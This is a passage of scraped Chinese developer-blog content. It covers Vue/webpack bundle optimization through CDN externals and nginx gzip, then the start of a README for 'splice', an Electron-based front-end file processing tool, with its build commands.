中分离出来，使用CDN资源引入。国内的CDN服务推荐使用 <a target=\"_blank\" href=\"https://link.juejin.im?target=http%3A%2F%2Fwww.bootcdn.cn%2F\" rel=\"nofollow noopener noreferrer\">BootCDN</a>。国外不是很好用。。。</p>\n<ul>\n<li>\n<p>首先在模板文件<code>index.html</code>中添加以下内容：</p>\n<pre><code class=\"hljs html\" lang=\"html\">...\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">head</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"https://cdn.bootcss.com/element-ui/2.0.7/theme-chalk/index.css\"</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">head</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">body</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">\"app\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://cdn.bootcss.com/vue/2.5.9/vue.min.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://cdn.bootcss.com/vuex/3.0.1/vuex.min.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://cdn.bootcss.com/vue-router/3.0.1/vue-router.min.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://cdn.bootcss.com/element-ui/2.0.7/index.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span>\n  <span class=\"hljs-comment\">&lt;!-- built files will be auto injected --&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">body</span>&gt;</span>\n</code></pre></li>\n<li>\n<p>修改 <code>build/webpack.base.conf.js</code>。关于 <code>externals</code> 配置项请自行查阅相关资料。</p>\n<pre><code class=\"hljs js\" lang=\"js\"><span class=\"hljs-built_in\">module</span>.exports = {\n  ...\n  externals: {\n    <span class=\"hljs-string\">'vue'</span>: <span class=\"hljs-string\">'Vue'</span>,\n    <span class=\"hljs-string\">'vuex'</span>: <span class=\"hljs-string\">'Vuex'</span>,\n    <span class=\"hljs-string\">'vue-router'</span>: <span class=\"hljs-string\">'VueRouter'</span>,\n    <span class=\"hljs-string\">'element-ui'</span>: <span class=\"hljs-string\">'ELEMENT'</span>\n  }\n  ...\n}\n</code></pre></li>\n<li>\n<p>修改 <code>src/router/index.js</code></p>\n<pre><code class=\"hljs js\" lang=\"js\"><span class=\"hljs-comment\">// import Vue from 'vue'</span>\n<span class=\"hljs-keyword\">import</span> VueRouter <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'vue-router'</span>\n<span class=\"hljs-comment\">// 注释掉</span>\n<span class=\"hljs-comment\">// Vue.use(VueRouter)</span>\n...\n</code></pre></li>\n<li>\n<p>修改 <code>src/store/index.js</code></p>\n<pre><code class=\"hljs js\" lang=\"js\">...\n<span class=\"hljs-comment\">// 注释掉</span>\n<span class=\"hljs-comment\">// Vue.use(Vuex)</span>\n...\n</code></pre></li>\n<li>\n<p>修改 <code>src/main.js</code></p>\n<pre><code class=\"hljs js\" lang=\"js\"><span class=\"hljs-keyword\">import</span> <span class=\"hljs-string\">'babel-polyfill'</span>\n<span class=\"hljs-keyword\">import</span> Vue <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'vue'</span>\n<span class=\"hljs-keyword\">import</span> App <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'./App'</span>\n<span class=\"hljs-keyword\">import</span> axios <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'axios'</span>\n<span class=\"hljs-keyword\">import</span> store <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'./store'</span>\n<span class=\"hljs-keyword\">import</span> router <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'./router'</span>\n<span class=\"hljs-keyword\">import</span> {sync} <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'vuex-router-sync'</span>\n<span class=\"hljs-keyword\">import</span> ELEMENT <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'element-ui'</span>\n<span class=\"hljs-comment\">// import 'element-ui/lib/theme-chalk/index.css'</span>\n\nVue.config.productionTip = <span class=\"hljs-literal\">false</span>\n\nVue.use(ELEMENT)\nVue.prototype.$http = axios\n\nsync(store, router)\n\n<span class=\"hljs-comment\">/* eslint-disable no-new */</span>\n<span class=\"hljs-keyword\">new</span> Vue({\n  <span class=\"hljs-attr\">el</span>: <span class=\"hljs-string\">'#app'</span>,\n  store,\n  router,\n  <span class=\"hljs-attr\">template</span>: <span class=\"hljs-string\">'&lt;App/&gt;'</span>,\n  <span class=\"hljs-attr\">components</span>: { App }\n})\n</code></pre><blockquote>\n<p>注意！这里 <code>element-ui</code> 变量名要使用 <code>ELEMENT</code>，因为<code>element-ui</code>的 umd 模块名是 <code>ELEMENT</code></p>\n</blockquote>\n</li>\n</ul>\n<p>再次打包，部署到Nginx服务，可以看到：</p>\n<p></p><figure><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/7/16030b8ca5b960e4?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"1280\" data-height=\"304\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;1280&quot; height=&quot;304&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p><code>vendor.js</code> 减少到了 112kb，提升85.5%！</p>\n<p>再看CDN资源：</p>\n<p></p><figure><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/7/16030bc1ee15811b?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"1280\" data-height=\"301\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;1280&quot; height=&quot;301&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>可以看出，5个请求共216kb，耗时619ms！</p>\n<h2 class=\"heading\" data-id=\"heading-3\">Nginx 开启 gzip</h2>\n<p>对 <code>vendor.js</code> 我们优化完了，接下来我们优化服务器上的资源。先看看没有开启 gzip 的效果：</p>\n<p></p><figure><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/7/16030c3e03bcc19f?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"1280\" data-height=\"402\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;1280&quot; height=&quot;402&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>可以看到有 13.5kb</p>\n<p>Nginx开启gzip，修改nginx配置文件 <code>nginx.conf</code>:</p>\n<pre><code class=\"hljs conf\" lang=\"conf\">...<br><br>http&nbsp;{<br>&nbsp;&nbsp;&nbsp;&nbsp;...<br>&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;gzip&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;on;<br>&nbsp;&nbsp;&nbsp;&nbsp;gzip_min_length&nbsp;&nbsp;&nbsp;&nbsp;1k;<br>&nbsp;&nbsp;&nbsp;&nbsp;gzip_buffers&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4&nbsp;&nbsp;16k;<br>&nbsp;&nbsp;&nbsp;&nbsp;#gzip_http_version&nbsp;&nbsp;1.1;<br>&nbsp;&nbsp;&nbsp;&nbsp;gzip_comp_level&nbsp;&nbsp;&nbsp;&nbsp;2;&nbsp;#&nbsp;压缩级别<br>&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;要压缩的mine类型<br>&nbsp;&nbsp;&nbsp;&nbsp;gzip_types&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;text/plain&nbsp;application/javascript&nbsp;application/x-javascript&nbsp;text/javascript&nbsp;text/css&nbsp;application/xml&nbsp;application/xml+rss&nbsp;image/jpeg&nbsp;image/gif&nbsp;image/png&nbsp;image/svg+xml;<br>&nbsp;&nbsp;&nbsp;&nbsp;gzip_vary&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;off;<br>&nbsp;&nbsp;&nbsp;&nbsp;gzip_proxied&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;expired&nbsp;no-cache&nbsp;no-store&nbsp;private&nbsp;auth;<br>&nbsp;&nbsp;&nbsp;&nbsp;gzip_disable&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\"MSIE&nbsp;[1-6]\\.\";&nbsp;#&nbsp;IE6不支持gzip<br>&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;...<br>}<br></code></pre><blockquote>\n<p>关于 nginx gzip，请自行查阅相关资料</p>\n</blockquote>\n<p>重启nginx服务，再看效果：</p>\n<p></p><figure><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/7/16030ca36a137f1d?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"1280\" data-height=\"319\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;1280&quot; height=&quot;319&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>可以看到服务器上的资源经过gzip压缩之后有 9kb，压缩比 13.3%。</p>\n<h2 class=\"heading\" data-id=\"heading-4\">development 和 production</h2>\n<p>上文中我们修改的是 <code>build/webpack.base.conf.js</code>，这样一来，本地开发的时候我们就不能使用 <code>vue-devtools</code> Chrome调试工具了，为了方便调试，我们需要将development和production 配置分开。</p>\n<ol>\n<li>首先将 <code>build/webpack.base.conf.js</code> 中 <code>externals</code> 配置项挪到 <code>build/webpack.prod.conf.js</code> 中：</li>\n</ol>\n<pre><code class=\"hljs js\" lang=\"js\"><span class=\"hljs-comment\">// build/webpack.prod.conf.js</span>\n<span class=\"hljs-built_in\">module</span>.exports = {\n  ...\n  externals: {\n    <span class=\"hljs-string\">'vue'</span>: <span class=\"hljs-string\">'Vue'</span>,\n    <span class=\"hljs-string\">'vuex'</span>: <span class=\"hljs-string\">'Vuex'</span>,\n    <span class=\"hljs-string\">'vue-router'</span>: <span class=\"hljs-string\">'VueRouter'</span>,\n    <span class=\"hljs-string\">'element-ui'</span>: <span class=\"hljs-string\">'ELEMENT'</span>\n  }\n  ...\n}\n</code></pre><ol start=\"2\">\n<li>拷贝 <code>index.html</code> 模板文件，并命名为 <code>index.prod.html</code>； 将原来的 <code>index.html</code> 重命名为 <code>index.dev.html</code>，并删除 CDN 资源：</li>\n</ol>\n<pre><code class=\"hljs html\" lang=\"html\"><span class=\"hljs-comment\">&lt;!-- index.dev.html --&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">head</span>&gt;</span>\n  ...\n  <span class=\"hljs-comment\">&lt;!-- &lt;link rel=\"stylesheet\" href=\"https://cdn.bootcss.com/element-ui/2.0.7/theme-chalk/index.css\"&gt; --&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">head</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">body</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">\"app\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span>\n  <span class=\"hljs-comment\">&lt;!-- &lt;script src=\"https://cdn.bootcss.com/vue/2.5.9/vue.min.js\"&gt;&lt;/script&gt;\n  &lt;script src=\"https://cdn.bootcss.com/vuex/3.0.1/vuex.min.js\"&gt;&lt;/script&gt;\n  &lt;script src=\"https://cdn.bootcss.com/vue-router/3.0.1/vue-router.min.js\"&gt;&lt;/script&gt;\n  &lt;script src=\"https://cdn.bootcss.com/element-ui/2.0.7/index.js\"&gt;&lt;/script&gt; --&gt;</span>\n  <span class=\"hljs-comment\">&lt;!-- built files will be auto injected --&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">body</span>&gt;</span>\n\n<span class=\"hljs-comment\">&lt;!-- index.prod.html --&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">head</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"https://cdn.bootcss.com/element-ui/2.0.7/theme-chalk/index.css\"</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">head</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">body</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">\"app\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://cdn.bootcss.com/vue/2.5.9/vue.min.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://cdn.bootcss.com/vuex/3.0.1/vuex.min.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://cdn.bootcss.com/vue-router/3.0.1/vue-router.min.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://cdn.bootcss.com/element-ui/2.0.7/index.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span>\n  <span class=\"hljs-comment\">&lt;!-- built files will be auto injected --&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">body</span>&gt;</span>\n</code></pre><ol start=\"3\">\n<li>修改 <code>build/webpack.dev.conf.js</code>:</li>\n</ol>\n<pre><code class=\"hljs js\" lang=\"js\">plugins: [\n  ...\n  new HtmlWebpackPlugin({\n    <span class=\"hljs-attr\">filename</span>: <span class=\"hljs-string\">'index.html'</span>,\n    <span class=\"hljs-attr\">template</span>: <span class=\"hljs-string\">'index.dev.html'</span>,\n    <span class=\"hljs-attr\">inject</span>: <span class=\"hljs-literal\">true</span>\n  })\n]\n</code></pre><ol start=\"4\">\n<li>修改 <code>build/webpack.prod.conf.js</code>:</li>\n</ol>\n<pre><code class=\"hljs js\" lang=\"js\">plugins: [\n  ...\n  new HtmlWebpackPlugin({\n    <span class=\"hljs-attr\">filename</span>: <span class=\"hljs-string\">'index.html'</span>,\n    <span class=\"hljs-attr\">template</span>: <span class=\"hljs-string\">'index.prod.html'</span>,\n    <span class=\"hljs-attr\">inject</span>: <span class=\"hljs-literal\">true</span>,\n    ...\n  })\n]\n</code></pre><ol start=\"5\">\n<li>修改 <code>vue-router</code>、<code>vuex</code>、<code>element-ui</code> 的引用：</li>\n</ol>\n<pre><code class=\"hljs js\" lang=\"js\"><span class=\"hljs-comment\">// src/main.js</span>\n...\nif (process.env.NODE_ENV === <span class=\"hljs-string\">'development'</span>) {\n  <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'element-ui/lib/theme-chalk/index.css'</span>)\n}\n...\n\n<span class=\"hljs-comment\">// src/router/index.js</span>\n<span class=\"hljs-keyword\">import</span> Vue <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'vue'</span>\n<span class=\"hljs-keyword\">import</span> VueRouter <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'vue-router'</span>\n\n<span class=\"hljs-keyword\">if</span> (process.env.NODE_ENV === <span class=\"hljs-string\">'development'</span>) {\n  Vue.use(VueRouter)\n}\n...\n\n<span class=\"hljs-comment\">// src/store/index.js</span>\n<span class=\"hljs-keyword\">import</span> Vue <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'vue'</span>\n<span class=\"hljs-keyword\">import</span> Vuex <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'vuex'</span>\n\n<span class=\"hljs-keyword\">if</span> (process.env.NODE_ENV === <span class=\"hljs-string\">'development'</span>) {\n  Vue.use(Vuex)\n}\n...\n</code></pre><p>这样我们就可以愉快的在开发环境使用 <code>vue-devtools</code> Chrome调试工具了！</p>\n<h2 class=\"heading\" data-id=\"heading-5\">总结</h2>\n<p>至此，我们初步的优化就完成了。我实际的项目首屏加载加上一些第三方客服，第三方校验等优化到近4s 左右。由于是演示项目，并没有开发其他的页面和功能，效果不是很明显，大家可以自行踩坑。大家有更好的方案，可以共同学习！</p>\n</div>"},{"title":"基于 Electron 的前端文件处理工具","avatar":"https://dn-mhke0kuv.qbox.me/zta6DYIpPMbzeDAkNmFsG7A?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"Alexee","create_time":"2017 年 12 月 07 日","tags":["前端","Gulp","CSS","Electron"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><h1 class=\"heading\" data-id=\"heading-0\">项目地址</h1>\n<p><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2FSuperAL%2Fsplice\" rel=\"nofollow noopener noreferrer\">Github</a>，欢迎 Star ~ ╰(<em>´︶`</em>)╯♡</p>\n<h1 class=\"heading\" data-id=\"heading-1\">splice</h1>\n<blockquote>\n<p>GUI workflow for Front-End developers based on Electron<br>\n欢迎下载来使用，代码的话感兴趣可以看（写得乱七八糟，能用就行，捂脸 \"(￣▽￣)\"\"\"）<br>\n解决痛点：急需处理一些前端文件时没有必要再编写并运行 <code>gulp</code> 代码或者打开在线网站：代码粘贴=&gt;压缩（或其他处理）=&gt;复制出来，使用这个 <code>Electron</code> 客户端可以直接选择所需操作，拖拽处理文件（可批量），处理后默认覆盖原文件，可添加重命名操作等等~</p>\n</blockquote>\n<h2 class=\"heading\" data-id=\"heading-2\">功能</h2>\n<h3 class=\"heading\" data-id=\"heading-3\">实现前端常用的文件处理功能：</h3>\n<ol>\n<li>HTML：\n<ul>\n<li>压缩 html</li>\n<li>通过 html 中的注释来合并 css / js</li>\n</ul>\n</li>\n<li>CSS：\n<ul>\n<li>添加兼容性前缀</li>\n<li>压缩 css</li>\n<li>图片转 base64</li>\n<li>精灵图\n<ul>\n<li>处理 css 文件并生成相应的精灵图</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>JS：\n<ul>\n<li>压缩 js</li>\n</ul>\n</li>\n<li>IMAGE：\n<ul>\n<li>压缩图片</li>\n<li>将多张图片合成精灵图并生成相应的 css</li>\n</ul>\n</li>\n<li>JSON：\n<ul>\n<li>压缩 json</li>\n</ul>\n</li>\n<li>通用：\n<ul>\n<li>格式化\n<ul>\n<li>格式化 JavaScript, JSON, HTML 和 CSS 等文件</li>\n</ul>\n</li>\n<li>文件重命名</li>\n<li>自定义设置\n<ul>\n<li>设置文件的导出目录</li>\n</ul>\n</li>\n</ul>\n</li>\n</ol>\n<h3 class=\"heading\" data-id=\"heading-4\">其他：</h3>\n<ul>\n<li>快捷键：\n<ul>\n<li>刷新页面：<code>Ctrl+Alt+R</code></li>\n<li>开启或关闭开发者工具：<code>Ctrl+Alt+T</code></li>\n</ul>\n</li>\n<li>右键菜单：\n<ul>\n<li>刷新：刷新页面</li>\n<li>开发者工具：开启或关闭开发者工具</li>\n<li>检查更新：检查是否有新版本</li>\n<li>重启应用：刷新解决不了的问题就重启吧</li>\n</ul>\n</li>\n<li>在线更新：\n<ul>\n<li>打开应用后默认检查更新，右键菜单也可以点击检查更新</li>\n<li>当 github 上存在更新的版本时，显示 <strong>一键升级</strong> 按钮</li>\n<li>更新思路：替换文件，自动安装新增的 npm 模块（可能安装失败，可以到应用根目录 <code>...resources/app/</code> 手动安装）</li>\n</ul>\n</li>\n</ul>\n<h2 class=\"heading\" data-id=\"heading-5\">截图</h2>\n<h3 class=\"heading\" data-id=\"heading-6\">界面：</h3>\n<p></p><figure><img alt=\"WIN\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/7/1602fb584441dff8?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"1000\" data-height=\"808\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;1000&quot; height=&quot;808&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure>\n<figure><img alt=\"MAC\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/7/1602fb5845e808ee?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"1240\" data-height=\"1002\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;1240&quot; height=&quot;1002&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<h3 class=\"heading\" data-id=\"heading-7\">简单操作：</h3>\n<p></p><figure><img alt=\"压缩并重命名图片\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/7/1602fb584bb7749f?imageslim\" data-width=\"1280\" data-height=\"514\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;1280&quot; height=&quot;514&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<h2 class=\"heading\" data-id=\"heading-8\">下载地址</h2>\n<ul>\n<li><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2FSuperAL%2Fsplice%2Freleases%2Fdownload%2F1.1.2%2Fsplice-win32-x64-v1.1.2.zip\" rel=\"nofollow noopener noreferrer\">win zip</a>（解压了找到 <code>splice.exe</code> 双击打开就能用）</li>\n<li><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2FSuperAL%2Fsplice%2Freleases%2Fdownload%2F1.1.2%2Fsplice-1.1.2.Setup.exe\" rel=\"nofollow noopener noreferrer\">win installer</a>（双击该文件进行安装，与开箱即用版差别就是该安装器小了 5MB，(＃￣▽￣＃)）</li>\n<li><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2FSuperAL%2Fsplice%2Freleases%2Fdownload%2F1.1.2%2FSplice-darwin-x64.zip\" rel=\"nofollow noopener noreferrer\">mac</a></li>\n</ul>\n<h2 class=\"heading\" data-id=\"heading-9\">开发</h2>\n<ol>\n<li>拉取项目</li>\n</ol>\n<pre><code class=\"hljs bash\" lang=\"bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/SuperAL/splice.git --depth=1\n<span class=\"hljs-comment\"># 解释一下那个 `--depth=1`，代表只获取最新的 commit 记录。 </span>\n<span class=\"hljs-comment\"># 因为之前的一些误操作，不小心将打包后的文件也上传到了 git，即使文件删掉了记录还是存在，因此记录文件超级大，直接导致 `clone` 超级慢。</span>\n<span class=\"hljs-comment\"># 加上 `--depth=1` 可以解决 `clone` 慢的问题。</span>\n</code></pre><ol start=\"2\">\n<li>安装依赖</li>\n</ol>\n<pre><code class=\"hljs bash\" lang=\"bash\">npm install \n</code></pre><ol start=\"3\">\n<li>运行项目</li>\n</ol>\n<pre><code class=\"hljs bash\" lang=\"bash\">npm run start\n</code></pre><ol start=\"4\">\n<li>打包项目</li>\n</ol>\n<pre><code class=\"hljs bash\" lang=\"bash\"><span class=\"hljs-comment\"># win 64位</span>\nnpm run pack:win\n\n<span class=\"hljs-comment\"># win 32位</span>\nnpm run pack:win32\n\n<span class=\"hljs-comment\"># mac，需要使用 mac 电脑</span>\nnpm run pack:mac\n</code></pre><p>第二种打包方式（使用了 <a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Felectron-forge\" rel=\"nofollow noopener noreferrer\">electron-forge</a>，该方式打包的 <code>exe</code> 版本比 <code>electron-packager</code> 大一点点）</p>\n<pre><code class=\"hljs bash\" lang=\"bash\"><span class=\"hljs-comment\"># 全局安装 electron-forge</span>\nnpm install electron-forge -g\n\n<span class=\"hljs-comment\"># 打包你当前使用的平台的版本</span>\nelectron-forge package\n\n<span class=\"hljs-comment\"># 制作安装器（installer） </span>\nelectron-forge make\n</code></pre><h2 class=\"heading\" data-id=\"heading-10\">使用到的文件操作相关模块</h2>\n<h4 class=\"heading\" data-id=\"heading-11\">工具类</h4>\n<ul>\n<li><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fgulp\" rel=\"nofollow noopener noreferrer\">gulp</a></li>\n<li><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fgulp-if\" rel=\"nofollow noopener noreferrer\">gulp-if</a></li>\n</ul>\n<h4 class=\"heading\" data-id=\"heading-12\">html 压缩</h4>\n<ul>\n<li><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fgulp-htmlmin\" rel=\"nofollow noopener noreferrer\">gulp-htmlmin</a></li>\n</ul>\n<h4 class=\"heading\" data-id=\"heading-13\">通过 html 文件处理 css、js 文件的合并</h4>\n<ul>\n<li><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fgulp-usemin2\" rel=\"nofollow noopener noreferrer\">gulp-usemin2</a></li>\n</ul>\n<h4 class=\"heading\" data-id=\"heading-14\">css 压缩、添加兼容前缀</h4>\n<ul>\n<li><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fgulp-postcss\" rel=\"nofollow noopener noreferrer\">gulp-postcss</a></li>\n<li><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fgulp-cssnano\" rel=\"nofollow noopener noreferrer\">gulp-cssnano</a></li>\n<li><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fautoprefixer\" rel=\"nofollow noopener noreferrer\">autoprefixer</a></li>\n</ul>\n<h4 class=\"heading\" data-id=\"heading-15\">将 css 中通过 url 引入的图片转成 base64</h4>\n<ul>\n<li><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fgulp-base64\" rel=\"nofollow noopener noreferrer\">gulp-base64</a></li>\n</ul>\n<h4 class=\"heading\" data-id=\"heading-16\">通过 css 生成精灵图</h4>\n<ul>\n<li><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fgulp-sprite-generator2\" rel=\"nofollow noopener noreferrer\">gulp-sprite-generator2</a></li>\n</ul>\n<h4 class=\"heading\" data-id=\"heading-17\">js 压缩</h4>\n<ul>\n<li><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fgulp-uglify\" rel=\"nofollow noopener 